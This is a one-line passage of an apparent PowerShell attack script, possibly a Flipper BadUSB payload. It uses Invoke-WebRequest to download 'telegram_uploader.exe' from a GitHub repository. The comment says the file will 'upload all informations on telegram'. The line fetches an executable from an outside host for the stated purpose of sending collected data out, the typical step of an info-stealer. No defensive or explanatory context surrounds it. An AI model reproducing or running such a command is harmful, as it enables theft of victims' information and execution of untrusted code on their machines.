...
Invoke-WebRequest https://github.com/DuongDarkFlippervgu/DuongVet/raw/main/telegram_uploader.exe -OutFile telegram_uploader.exe #Download uploader file to upload all informations on telegram
